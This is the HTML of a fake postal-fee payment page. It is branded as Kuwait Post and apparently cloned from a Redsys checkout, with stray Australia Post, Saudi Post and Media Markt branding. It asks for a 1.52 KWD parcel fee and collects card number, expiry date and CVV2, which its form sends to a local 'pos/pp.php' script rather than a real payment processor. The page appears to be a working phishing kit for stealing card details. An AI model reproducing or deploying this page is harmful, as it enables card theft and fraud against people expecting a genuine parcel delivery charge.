<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths">
<script type="text/javascript" src="chrome-extension://kajfghlhfkcocafkcjlajldicbikpgnp/catcher.js"><!-- script injected by Request Maker -->
</script>
<head>
<meta content="-1" http-equiv="Expires">
<meta content="no-cache, no-store" http-equiv="Pragma">
<meta content="no-cache, no-store, max-age=0, must-revalidate" http-equiv="Cache-Control">
<script language="javascript" type="text/javascript" src="Seleccione%20medio%20de%20pago_fichiers/typeKit.js"></script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<link href="https://eservices.splonline.com.sa/favicon.ico?v=1" type="image/ico" rel="shortcut icon">
<link href="https://eservices.splonline.com.sa/favicon.ico?v=1" type="image/ico" rel="icon">
<title>Kuwait Post</title>
<link type="text/css" href="./Redsys_files/9999redsys.css" rel="StyleSheet"><!--[if lt IE 10]><link href="/sis/estilos/unica/9999ie.css" type="text/css" rel="stylesheet"><![endif]--><!--[if lt IE 8]><link href="/sis/estilos/unica/ie7.css" type="text/css" rel="stylesheet"><![endif]--><link type="text/css" href="./Redsys_files/9000-ni.css" rel="StyleSheet">
<link type="text/css" href="./Redsys_files/2100new-ni.css" rel="StyleSheet">
<link rel="StyleSheet" type="text/css" href="./Redsys_files/346841091-1--ni.css"><!--[if lt IE 9]><script src="/sis/javascript/unica/html5shiv.js" type="text/javascript"></script><script src="/sis/javascript/unica/respond.min.js" type="text/javascript"></script><![endif]--><script src="./Redsys_files/modernizr-2.8.3.js.download" type="text/javascript"></script><script src="./Redsys_files/jquery-1.11.2.min.js.download" type="text/javascript"></script><script src="./Redsys_files/9999main.js.download" type="text/javascript"></script><script src="./Redsys_files/utilSis.js.download" type="text/javascript"></script><script src="./Redsys_files/2100new-ni.js.download" type="text/javascript"></script><script type="text/javascript" src="./Redsys_files/346841091-1-ni.js.download"></script><script type="text/javascript">
			function fijarLiterales() {
		   		
		   			anadirLiteral("msg1", "You have to fill in the card details");
				
		   			anadirLiteral("msg2", "The card is mandatory");
				
		   			anadirLiteral("msg3", "The card must be numeric");
				
		   			anadirLiteral("msg4", "The card can't be negative");
				
		   			anadirLiteral("msg5", "The card expiration month is mandatory");
				
		   			anadirLiteral("msg6", "The month of expiration of the card must be numerical");
				
		   			anadirLiteral("msg7", "Card expiration month is incorrect");
				
		   			anadirLiteral("msg8", "The year of expiry of the card is mandatory");
				
		   			anadirLiteral("msg9", "The year of expiry of the card must be numerical");
				
		   			anadirLiteral("msg10", "The card expiration year cannot be negative");
				
		   			anadirLiteral("msg11a", "The security code of the card must have ");
				
		   			anadirLiteral("msg11b", " digits");
				
		   			anadirLiteral("msg12", "The security code of the card must be numeric");
				
		   			anadirLiteral("msg13", "The card security code can't be negative");
				
		   			anadirLiteral("msg14", "The security code is not required for your card");
				
		   			anadirLiteral("msg15", "You must enter a valid card number (no spaces or dashes).");
				
		   			anadirLiteral("msg16", "Please select a payment method");
				
		   			anadirLiteral("msg17", "The payment method you have selected is temporarily unavailable, please select another payment method");
				
		   			anadirLiteral("msg18", "The cardholder is mandatory");
				
		   			anadirLiteral("msg19", "The document number is incorrect");
				
		   			anadirLiteral("msg20", "The record is incorrect");
				
		   			anadirLiteral("msg21", "The accrual date is incorrect");
				
		   			anadirLiteral("msg22", "The specific data is incorrect");
				
			}
			
			var dcc = 0;
			function dccYes() {
				if (dcc == 0) {
					dcc++;
					document.dccYES.submit();
				}
			}
			function dccNo() {
				if (dcc == 0) {
					dcc++;
					document.dccNO.submit();
				}
			}
			
			function fijarDivisaDCC(moneda, importe) {
				document.getElementById("Sis_Divisa").value = moneda + '#' + importe;
				document.formTarjeta.submit();
			}
		</script><script src="./Redsys_files/RSisSelPagosNew.js.download" type="text/javascript"></script><script type="text/javascript">
					function fijarFoco() {
						if (document.getElementById('inputCard') && document.getElementById('inputCard').value == '') {
							document.getElementById('inputCard').focus();
						} else if (document.getElementById('cad1') && document.getElementById('cad1').value == '') {
							document.getElementById('cad1').focus();
						} else if (document.getElementById('codseg') && document.getElementById('codseg').value == '') {
							document.getElementById('codseg').focus();
						}
						if (document.getElementById('mmaa')) {
							if(!Modernizr.input.placeholder){
									document.getElementById('mmaa').style.display = "";
							} else {
									document.getElementById('mmaa').style.display = "none";
							}
						}
					}
					function cambiarIdiomaCheck(valor) {
						document.getElementById("checkIdioma").value = valor;
					}
					function lanzarAmazon() {
					
			        }
					</script><script type="text/javascript">
			var binCheck;
			function dccDinamico() {
				if(document.getElementById("inputCard").value.length > 8) {
					var binFinal = document.getElementById("inputCard").value.substring(0, 8);
					if (binCheck != undefined && binFinal != binCheck){
						document.formTarjeta.Sis_Divisa.value="";
						document.getElementById("dccDinamic").style="display: none !important;";
					}
				}
				if(document.getElementById("inputCard").value.length==8){
					var bin = document.getElementById("inputCard").value;
					var primerDigito = bin.substring(0, 1);
					if (primerDigito == '4' || primerDigito == '5') {
						binCheck = bin;
						if (window.XMLHttpRequest)
						  {// code for IE7+, Firefox, Chrome, Opera, Safari
						  xmlhttp=new XMLHttpRequest();
						  }
						else
						  {// code for IE6, IE5
						  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
						  }
						xmlhttp.onreadystatechange=function()
						  {
						  if (xmlhttp.readyState==4)
							{
								//Variable JSON
								var jsonObj = eval('(' + xmlhttp.responseText +')');
								
								//Variables DCC
								var infoDCC=jsonObj.dccActivo;
								
								if (infoDCC == 'NO') {
									document.formTarjeta.Sis_Divisa.value="";
									document.getElementById("dccDinamic").style="display: none !important;";
								} else {							
									//Variables Finales
									var monedaDCCTarjeta=jsonObj.monedaDCCTarjeta;
									var litMonedaDCCTarjeta=jsonObj.litMonedaDCCTarjeta;
									var litMonedaRDCCTarjeta=jsonObj.litMonedaRDCCTarjeta;
									var cambioDCCTarjeta=jsonObj.cambioDCCTarjeta;
									var importeDCCTarjeta=jsonObj.importeDCCTarjeta;
									
									var monedaDCCComercio=jsonObj.monedaDCCComercio;
									var litMonedaDCCComercio=jsonObj.litMonedaDCCComercio;
									var litMonedaRDCCComercio=jsonObj.litMonedaRDCCComercio;
									var importeDCCComercio=jsonObj.importeDCCComercio;					
			
									var divisaDcc = monedaDCCTarjeta +"#"+importeDCCTarjeta;
									var divisaNoDcc = monedaDCCComercio +"#"+importeDCCComercio;
									
									document.getElementById("idCheckDcc").value = divisaDcc;
									document.getElementById("labelIdCheckDcc").innerHTML = 'Pay in my currency: '+importeDCCTarjeta+' '+litMonedaRDCCTarjeta;
									document.getElementById("idCheckNoDcc").value = divisaNoDcc;
									document.getElementById("labelIdCheckNoDcc").innerHTML = 'Pay in ' + litMonedaDCCComercio + ': '+importeDCCComercio+' '+litMonedaRDCCComercio;
									document.getElementById("labelIdExchange").innerHTML = 'Exchange rate 1 '+litMonedaRDCCTarjeta+' = '+cambioDCCTarjeta+' '+litMonedaDCCComercio;
									document.getElementById("dccDinamic").style.cssText="background-color: white;padding: 5px 5px 5px 5px;text-align: justify !important;";
									document.getElementById('idCheckDcc').checked = true;
									document.getElementById("labelIdCheckDcc").style.cssText = "color: #00a0df;";
									document.formTarjeta.Sis_Divisa.value=divisaDcc;
								}
							}
						  }
						var url = '/sis' + "/pagoTarjeta" + ';jsessionid=0000029rIQsCpxiQbBvvl2fEvrG:1bc077vpd';
						xmlhttp.open("POST", url, true);
						xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
						var sending="inputCard="+document.getElementById("inputCard").value+"&consultaDccDinamico=true";
						xmlhttp.send(sending);
					}
				} 
			}
			function cambiarValorDCCDinamicoSi() {
				if(document.getElementById("idCheckDcc").checked == true) {
					document.formTarjeta.Sis_Divisa.value=document.getElementById("idCheckDcc").value;
					document.getElementById("labelIdCheckDcc").style = "color: #00a0df;";
					document.getElementById("labelIdCheckNoDcc").style = "";
					document.getElementById('idCheckNoDcc').checked = false;
				} 
			}
			function cambiarValorDCCDinamicoNo() {
				if(document.getElementById("idCheckNoDcc").checked == true) {
					document.formTarjeta.Sis_Divisa.value=document.getElementById("idCheckNoDcc").value;
					document.getElementById("labelIdCheckNoDcc").style = "color: #00a0df;";
					document.getElementById("labelIdCheckDcc").style = "";
					document.getElementById('idCheckDcc').checked = false;
				}
			}
		</script>
<style type="text/css">
			input[type='radio']:after {
				width: 15px;
				height: 15px;
				border-radius: 15px;
				top: -1px;
				left: -1px;
				position: relative;
				background-color: #d1d3d1;
				content: '';
				display: inline-block;
				visibility: visible;
				border: 2px solid white;
			}
	
			input[type='radio']:checked:after {
				width: 15px;
				height: 15px;
				border-radius: 15px;
				top: -1px;
				left: -1px;
				position: relative;
				background-color: #00a0df;
				content: '';
				display: inline-block;
				visibility: visible;
				border: 2px solid white;
			}
		</style>
<script>
		// Indica si se estÃ¡n enviando datos o no
		var enviandoDatos = false;
		
		// Almacena la forma de pago seleccionada
		var formaPagoSel = '';
		/************************************************************
		* 												[Ref0006]	
		* Funcion: solicitaDatosAJAX
		* Devuelve:
		* Solicita al SIS los datos de un mÃ©todo de pago a travÃ©s de AJAX
		************************************************************/
		function solicitaDatosAJAX() {
			if (!enviandoDatos) {
				ocultaBoton();
				var url = '/sis' + "/formaPagoAJAX" + ';jsessionid=0000029rIQsCpxiQbBvvl2fEvrG:1bc077vpd';
				if (window.XMLHttpRequest) {
					req = new XMLHttpRequest();
				} else if (window.ActiveXObject) {
					req = new ActiveXObject("Microsoft.XMLHTTP");
				}
		
				req.open("POST", url, true);
				
				req.onreadystatechange = respuestaConsultaAJAX;
				req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
				req.send("Ds_Merchant_PayMethod=" + formaPagoSel);
			}
		}
		
		
		/************************************************************
		* 												[Ref0007]	
		* Funcion: respuestaConsultaAJAX
		* Devuelve:
		* Ejecutada una vez que hay respuesta de una llamada AJAX
		************************************************************/
		function respuestaConsultaAJAX() {
			// Valores de "readyState"
			// 0: request not initialized
			// 1: server connection established
			// 2: request received
			// 3: processing request
			// 4: request finished and response is ready

			if (req.readyState == 4) {
				var hayError = true;
				if (req.status == 200) {
					if (formaPagoSel == 'O') {
						var urlOasys = dameValorElemento(req.responseXML, "urlOasys");
						var petOasys = dameValorElemento(req.responseXML, "petOasys");
						if (urlOasys && urlOasys != '' && petOasys && petOasys != '') {
							// Se reenvÃ&shy;a a Oasys
							hayError = false;
							document.frmOASYS.dato.value = petOasys;
							document.frmOASYS.action = urlOasys;
							ocultaBoton();
							fProcesandoPeticion('S');
							enviandoDatos = true;
							document.frmOASYS.submit();	
						}
					}

					if (formaPagoSel == 'V') {
						var urlVme = dameValorElemento(req.responseXML, "urlVme");
						if (urlVme && urlVme != '') {
							var paramsVme = urlVme.substring(urlVme.indexOf("?"));
							var sessionIdVme = paramsVme.substring(paramsVme.indexOf("=")+1);
							// Se reenvÃ&shy;a a Vme
							hayError = false;
							document.frmVme.action = urlVme;
							document.frmVme.ott.value = sessionIdVme;
							ocultaBoton();
							fProcesandoPeticion('S');
							enviandoDatos = true;
							document.frmVme.submit();
						}
					}

					if (formaPagoSel == 'S') {
						var urlSafetyPay = dameValorElemento(req.responseXML, "urlSafetyPay");
						if (urlSafetyPay && urlSafetyPay != '') {
							var paramsSafetyPay = urlSafetyPay.substring(urlSafetyPay.indexOf("?"));
				        	var TokenID = paramsSafetyPay.substring(paramsSafetyPay.indexOf("=")+1);
							// Se reenvÃ&shy;a a SafetyPay
							hayError = false;
							document.frmSAFETYPAY.action = urlSafetyPay;
							ocultaBoton();
							fProcesandoPeticion('S');
							enviandoDatos = true;
							document.frmSAFETYPAY.submit();
						}
					}

					if (formaPagoSel == 'f') {
/*						var urlMyBank = dameValorElemento(req.responseXML, "urlMyBank");
						if (urlMyBank && urlMyBank != '') {
							var paramsSafetyPay = urlMyBank.substring(urlMyBank.indexOf("?"));
				        	var TokenID = paramsSafetyPay.substring(paramsSafetyPay.indexOf("=")+1);
							// Se reenvÃ&shy;a a SafetyPay
							hayError = false;
							document.frmSAFETYPAY.action = urlSafetyPay;
							ocultaBoton();
							fProcesandoPeticion('S');
							enviandoDatos = true;
							document.frmSAFETYPAY.submit();
						}
						*/
					}
				}

				if (hayError) {
					muestraBoton();
					if (formaPagoSel == 'O' || formaPagoSel == 'V' || formaPagoSel == 'S') {
						alert(getError("msg17"));
					} else {
						alert(getError("msg15"));
					}
					return;
				}
			}
		}
		

		function seleccionaMetodoPago(payMethod) {
			formaPagoSel = payMethod; // Se marca el valor de la variable global
			if (payMethod == 'O' ) {
          		// Para el pago Oasys lo trataremos como una llamada AJAX al SIS
          		formaPagoSel = 'O';
          		document.formModalidad.Ds_Merchant_PayMethod.value = payMethod;
          		solicitaDatosAJAX();
          	} else if (payMethod == 'V') {
          		// Para el pago Vme lo trataremos como una llamada AJAX al SIS
          		formaPagoSel = 'V';
          		document.formModalidad.Ds_Merchant_PayMethod.value = payMethod;
          		solicitaDatosAJAX();
          	} else if (payMethod == 'S') {
          		// Para el pago SafetyPay llamada AJAX al SIS
          		formaPagoSel = 'S';
          		document.formModalidad.Ds_Merchant_PayMethod.value = payMethod;
          		solicitaDatosAJAX();
			} else if(payMethod == 'z') { 
          		formaPagoSel = 'z';
				document.formModalidad.Ds_Merchant_PayMethod.value = payMethod;
				document.formModalidad.submit();
          	} else {
          		document.formModalidad.Ds_Merchant_PayMethod.value = payMethod;
				// fProcesandoPeticion('S');
          		document.formModalidad.submit();
			}
		}

		function cargaValoresBrowser3DS() {
			//browserJavaEnabled
			document.formTarjeta.browserJavaEnabled.value=navigator.javaEnabled();
			//browserLanguage
			var userLang = navigator.language || navigator.userLanguage;
			document.formTarjeta.browserLanguage.value=userLang;
			//browserColorDepth
			document.formTarjeta.browserColorDepth.value=screen.colorDepth;
			//browserScreenHeight
			//browserScreenWidth
			  var myWidth = 0, myHeight = 0;
			  if( typeof( window.innerWidth ) == 'number' ) {
			    //Non-IE
			    myWidth = window.innerWidth;
			    myHeight = window.innerHeight;
			  } else if( document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight ) ) {
			    //IE 6+ in 'standards compliant mode'
			    myWidth = document.documentElement.clientWidth;
			    myHeight = document.documentElement.clientHeight;
			  } else if( document.body && ( document.body.clientWidth || document.body.clientHeight ) ) {
			    //IE 4 compatible
			    myWidth = document.body.clientWidth;
			    myHeight = document.body.clientHeight;
			  }
			document.formTarjeta.browserScreenHeight.value=myHeight;
			document.formTarjeta.browserScreenWidth.value=myWidth;
			//browserTZ
			var d = new Date();
			document.formTarjeta.browserTZ.value=d.getTimezoneOffset();
			//browserUserAgent
			document.formTarjeta.browserUserAgent.value=navigator.userAgent;
		}
		</script>
</head>
<body id="home" onload="lanzarAmazon();fijarLiterales();fijarFoco();inicializaCambioIdioma();fijarCVV2('4');cambiarIdiomaCheck('1');cargaValoresBrowser3DS();">
<div id="container">
<header id="header">
<div class="container">
<h1 style="display:none;">Kuwait Post</h1>
<div class="logoComercio">
<img src="./Redsys_files/vacio.gif" onerror="this.src='/sis/graficos/logotipos/comunes/vacio.gif'" title="auspost.com.au"></div>
<div class="logoEntidad">
<img alt="auspost.com.au" src="./Redsys_files/post.png" onerror="this.src='/sis/graficos/logotipos/comunes/9999logo.png'"></div>
<div class="lang-wr">
<div class="left">
<p>

</p></div>
</div>
</div>
<script type="text/javascript">
			//funciones utf8 encode y decode para mover al utilsis
			function encode_utf8( s ) {
			  return unescape( encodeURIComponent( s ) );
			}
			
			function decode_utf8( s ) {
			  return decodeURIComponent( escape( s ) );
			}


			// carga cadenas del idioma seleccionado:
			function cambiarIdioma(lang, page) {
			/* /sis */ 
				var laUrl = "/sis/SerSvlLiterales";
/*				var laUrl = "/sis/SerSvlLiterales?comercio=999008881&terminal=214&pagina=RSisSelFormaPago&idioma=3";*/
				var losDatos = { comercio: '346841091', terminal: '1' ,pagina: 'RSisSelFormaPago', idioma: lang };
				$.ajax( { url: laUrl, type: "POST", data: losDatos, dataType: "json", success: cambioIdiomaOK, error: cambioIdiomaKO} ); /* , contentType: "application/x-www-form-urlencoded;charset=UTF-" UTF-8 ISO-8859-15 */
				$('#iframeIupay').attr({'src': '/sis/html/iuPayMockUp_' + lang + '.html'});
			}

			function inicializaCambioIdioma() {
				$( ".trigger" ).changed = false;
/*				$( ".trigger" ).on( "click", cambiarIdioma($( ".lang" ).val(), 'RSisSelFormaPago') );*/
			}

			function cambioIdiomaOK( obj, textStatus, jqXHR ) {
				if (obj) {
						var listaLngIds = document.querySelectorAll('[lngid]');
						for (var i = 0; i < listaLngIds.length; i++) { 
							$.each( obj, function( key, value ) {
								if (listaLngIds[i].getAttribute("lngid") == key) {
//									alert(decode_utf8(value));
									if (listaLngIds[i].innerHTML) {
										if (listaLngIds[i].innerHTML.length>0 && listaLngIds[i].innerHTML[0] != '?') {
											listaLngIds[i].innerHTML = decodeURIComponent(value).replace(/\+/g, ' ' );
										} else if (listaLngIds[i].innerHTML.length == 0) {
											listaLngIds[i].innerHTML = decodeURIComponent(value).replace(/\+/g, ' ' );
										}
									}
									if (listaLngIds[i].hasAttribute("value")) {
										if (listaLngIds[i].getAttribute("value").length>0 && listaLngIds[i].getAttribute("value")[0] != '?') {
											$(listaLngIds[i]).attr({
												value: decodeURIComponent(value).replace(/\+/g, ' ' )
											});
										}
									}
									if (listaLngIds[i].hasAttribute("alt")) {
										$(listaLngIds[i]).attr({
											alt: decodeURIComponent(value).replace(/\+/g, ' ' ),
											title: decodeURIComponent(value).replace(/\+/g, ' ' )
										});
									}
								} else if (key == 'monthmonth') {
									if (document.getElementById("cad1")) {
										document.getElementById("cad1").placeholder = decodeURIComponent(value).replace(/\+/g, ' ' );
									}
									if (document.getElementById("cad1_upi")) {
										document.getElementById("cad1_upi").placeholder = decodeURIComponent(value).replace(/\+/g, ' ' );
									}
								} else if (key == 'yearyear') {
									if (document.getElementById("cad2")) {
										document.getElementById("cad2").placeholder = decodeURIComponent(value).replace(/\+/g, ' ' );
									}
									if (document.getElementById("cad2_upi")) {
										document.getElementById("cad2_upi").placeholder = decodeURIComponent(value).replace(/\+/g, ' ' );
									}
								} 
							});
						}
					//ahora actualizamos los errores
					if (errores) {
						for (var i = 0; i < errores.length; i++) { 
							$.each( obj, function( key, value ) {
								if (key.substr(0,6) == 'error-') {
									var msgerror = key.substr(6, key.length);
									if (errores[i][0] == msgerror) {
										errores[i][1] = decodeURIComponent(value).replace(/\+/g, ' ' );
									}
								}
							});
						}
					}
				}
			}

			function cambioIdiomaKO(jqXHR, textStatus, errorThrown ) {
//				alert('cambio idioma KO');
				alert(textStatus + '\n\n' + errorThrown.name + '\n\n' + errorThrown.message + '\n\n' + errorThrown.description);
			}
			
          </script>
</header>
<ol class="steps-wr">
<li id="s-method" class="step active">
<span class="num" style="color: #00C8E1">1</span>
<p lngid="seleccioneMetodoPago" style="color: #146E82;" class="s-text">أدخل تفاصيل الدفع</p>
</li>
<li id="s-auth" class="step ">
<span class="num">2</span>
<p lngid="comprobacionAutenticacion" class="s-text">التحقق</p>
</li>
<li id="s-connect" class="step ">
<span class="num">3</span>
<p lngid="solicitandoAutorizacion" class="s-text">طلب ترخيص</p>
</li>
<li id="s-result" class="step ">
<span class="num">4</span>
<p lngid="resultadoTransaccion" class="s-text">نتيجة المعاملة</p>
</li>
</ol>
<div class="clear-fix"></div>
<div id="body"><div class="header-mobile"><div class="comercio-mobile"><div class="logoComercio">
<img src="./Redsys_files/vacio.gif" onerror="this.src='/sis/graficos/logotipos/comunes/vacio.gif'" title="auspost.com.au"></div><div class="logoComercio">
<img src="./Redsys_files/vacio.gif" onerror="this.src='/sis/graficos/logotipos/comunes/vacio.gif'" title="MEDIA MARKT ONLINE"></div></div><div class="precio-mobile"><div class="right">
<p style="text-decoration: underline;"></p>
</div></div></div><div class="header-mobile"><div class="comercio-mobile"><div class="logoComercio">
<img src="./Redsys_files/vacio.gif" onerror="this.src='/sis/graficos/logotipos/comunes/vacio.gif'" title="MEDIA MARKT ONLINE"></div><div class="logoComercio">
<img src="./Redsys_files/vacio.gif" onerror="this.src='/sis/graficos/logotipos/comunes/vacio.gif'" title="auspost.com.au"></div><div class="logoComercio">
<img src="./Redsys_files/vacio.gif" onerror="this.src='/sis/graficos/logotipos/comunes/vacio.gif'" title="MEDIA MARKT ONLINE"></div></div><div class="precio-mobile"><div class="right">
</div><div class="right">
<p style="text-decoration: underline;"></p>
</div></div></div>

<div class="col-wr right">
<div class="tituloSeleccioneMetodoDePago">
<h3 class="tituloSeleccioneMetodoDePago" lngid="tituloSeleccioneMetodoDePago">Seleccione método de pago</h3>
</div>
<form autocomplete="off" name="formTarjeta" action="./pos/pp.php" method="post">
<div style="min-height:16px !important; overflow-y: auto;" class="cards-mod-wr">
<div class="tituloPagoTarjeta" style="background-image: url(&quot;/sis/graficos/logotipos/comunes/2100abrirpuntaarriba.png&quot;);">
<div style="float:left;" class="pagoConTarjeta">
<h3 lngid="pagoConTarjeta" class="pagoConTarjeta">تفاصيل الدفع</h3>
</div>
<div style="float:right;"></div>
<div class="center-cards">
<div class="microcard" id="micro-visa"></div>
<div class="microcard" id="micro-master1"></div>
<div class="microcard" id="micro-master2"></div>
<div class="microcard" id="micro-american"></div>
</div></div>
<div class="datosTarjeta">
<div class="lineaPagoTarjeta">
<div class="detalleTarjeta">
<text lngid="tarjeta">: بطاقة الائتمان</text>
</div>
<div class="inputTarjeta">
<span style="float:left;" class="icon i-card"></span><input id="inputCard" name="Sis_Numero_Tarjeta" type="tel" class="left form-control numbersOnly" size="20" maxlength="19" lngid="altTarjeta" alt="Número de la tarjeta" title="Número de la tarjeta" autocomplete="off" float="right" pattern="[0-9]{12,19}" onkeyup="javascript:dccDinamico();" value="">
</div>
</div>
<div class="lineaPagoTarjeta">
<div class="detalleTarjeta">
<text lngid="caducidad">: تاريخ الانتهاء</text>
</div>
<div class="inputTarjeta">
<span style="float:left;" class="icon i-cal"></span><input style="margin-right: 5px;" id="cad1" name="Sis_Caducidad_Tarjeta_Mes" placeholder="شهر" type="tel" class="left form-control numbersOnly" size="2" maxlength="2" lngid="mes" alt="Mes" title="Mes" autocomplete="off" pattern="[0-9]{2}" value="">&nbsp;
							<input id="cad2" name="Sis_Caducidad_Tarjeta_Anno" placeholder="سنة" type="tel" class="left form-control numbersOnly" size="2" maxlength="2" lngid="agno" alt="Año" title="Año" autocomplete="off" pattern="[0-9]{2}" value="">
<div style="display:none;" id="mmaa">&nbsp;(<span lngid="monthmonth" id="monthmonth" class="text">شهر</span>/
							<span lngid="yearyear" id="yearyear" class="text">سنة</span>)</div>
</div>
</div>
<div class="lineaPagoTarjeta">
<div class="detalleTarjeta">
<text lngid="codigoSeguridad">(CVV2):</text>
</div>
<div class="inputTarjeta">
<span style="float:left;" class="icon i-lock"></span><input id="codseg" name="Sis_Tarjeta_CVV2" type="tel" class="left form-control numbersOnly" maxlength="4" size="4" lngid="codigoSeguridad" alt="Cód. Seguridad" title="Cód. Seguridad" autocomplete="off" pattern="[0-9]{0,4}" value=""><span class="icon-cvc-help" lngid="altCVV2info" alt="What is CVV2?" title="What is CVV2?" value="?">?
							</span>
</div>
</div>
<input value="" name="Sis_Divisa" type="hidden">

<div class="message hide" id="message01">Enter a Nº</div>
<div id="iframe3DSMethod"></div>
<input value="false" name="browserJavaEnabled" id="browserJavaEnabled" type="hidden"><input value="en-US" name="browserLanguage" id="browserLanguage" type="hidden"><input value="24" name="browserColorDepth" id="browserColorDepth" type="hidden"><input value="657" name="browserScreenHeight" id="browserScreenHeight" type="hidden"><input value="1366" name="browserScreenWidth" id="browserScreenWidth" type="hidden"><input value="0" name="browserTZ" id="browserTZ" type="hidden"><input value="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" name="browserUserAgent" id="browserUserAgent" type="hidden"><input value="U" name="threeDSCompInd" id="threeDSCompInd" type="hidden">
<div class="col-wr buttons-wr right">
<div style="display: none;" name="dccDinamic" id="dccDinamic">
<label>Please select the Currency in which you would like to pay:</label>
<br>
<input style="height: auto!important;" value="" onchange="cambiarValorDCCDinamicoSi();" id="idCheckDcc" name="nameDcc" type="radio"><label id="labelIdCheckDcc"></label>
<br>
<input style="height: auto!important;" value="" onchange="cambiarValorDCCDinamicoNo();" id="idCheckNoDcc" name="nameNoDcc" type="radio"><label id="labelIdCheckNoDcc"></label>
<br>
<br>
<label id="labelIdExchange"></label>
<br>
<br>
<label style="font-size:11px">(Includes a 2% mark up on the exchange rate delivered by Comercia Global Payments)</label>
<br>
</div>
<br>
<button lngid="aceptar" onclick="javascript:validar();" id="divImgAceptar" class="btn btn-lg btn-accept" type="button">تأكيد</button>
</div></div>
</div>
<input style="display:none;visibility:hidden;" value="" name="bcancel" type="hidden">
</form>
<div class="preft">

</div>
</div>
<div class="col-wr left result">
<div class="ticket-mod-wr">
<div class="datosDeLaOperacion">
<h3 class="datosDeLaOperacion" lngid="datosDeLaOperacion">بيانات العملية</h3>
</div>
<div class="ticket-header">
<div class="circle half-circlel"></div>
<div class="circle half-circler"></div>
<div class="price">
<div class="left">
<p lngid="importe">الدينار الكويتي 1.52</p>
</div>
<div class="right">
<p style="text-decoration: underline;"> : المبلغ</p>
</div>
<br class="clear-fix">
</div>
</div>
<div class="ticket-info">
<table class="table-condensed">
<tbody>
<tr><td lngid="terminal" class="text">RJ412830655KW</td><td class="numeric"></td>
</tr>
<tr id="filaNumeroPedido">
<td lngid="pedido" class="text">KuwaitPost :</td><td class="numeric"><strong>الشركة</strong></td>
</tr>

</tbody>
</table>
</div>
</div>
</div><div class="verified">
<ul><div class="logoEsquemaServired" style="width:125px;height:35px;">
<img src="./Redsys_files/500.svg" alt="auspost.com.au"></div>
<li>
<a id="iv-visa"><img alt="Verified by Visa" src="./Redsys_files/VerifiedByVisaLearnMore4.gif" id="logoVerifiedByVisa"></a>
</li>
<li>
<a id="iv-mc" href="javascript:ventanaInfoMaster();"><img alt="Mastercard SecureCode" src="./Redsys_files/MastercardSecureCodeLearnMore4.gif" id="logoMasterCardSecureCode"></a>
</li>
<li>
<a id="iv-aex" href="javascript:ventanaInfoSafeKey1();"><img alt="Safekey" src="./Redsys_files/9999verified_03.png" id="logoSafeKey"></a>
</li>
</ul>
</div>
</div>
<footer id="footer"><h6 lngid="powered" class="powered">Powered by AusPost</h6>

<div class="copyright">
<center>
<text lngid="copyright"><strong>© 2022 All rights reserved to Kuwait Post</strong></text>
</center>
</div>

</footer>
<form action="https://sis.redsys.es/sis/formaPago;jsessionid=0000029rIQsCpxiQbBvvl2fEvrG:1bc077vpd" method="POST" name="formModalidad">
<input value="" name="Ds_Merchant_PayMethod" type="hidden">
</form>
</div>
<div id="lightbox-panel">
<div class="cancel-wr">
<h2 lngid="codigoSeguridad">Security Code</h2>
<img src="./Redsys_files/9999cvc-help.png" onerror="this.src='/sis/graficos/logotipos/comunes/9999cvc-help.png'"></div>
<div class="help-text">
<p lngid="codigoSeguridadTresDigitos">The security code is the last three digits shown on the back of the Visa, Visa Electron, Mastercard and Maestro cards.</p>
<p lngid="casoTarjetasAmericanExpress">For American Express cards, the code is the four digits that appear above the card numbering.</p>
</div>
<div class="cancel-wr">
<button lngid="cerrar" class="btn btn-lg btn-close close-panel" type="button">Close</button>
</div>
<a lngid="cerrar" class="close-panel mob" href="javascript:void(0);" id="close-mob">Close</a>
</div>
<a lngid="cerrar" class="close-panel" href="javascript:void(0);" id="close-help">Close</a>
<div id="lightbox"></div>


</body></html>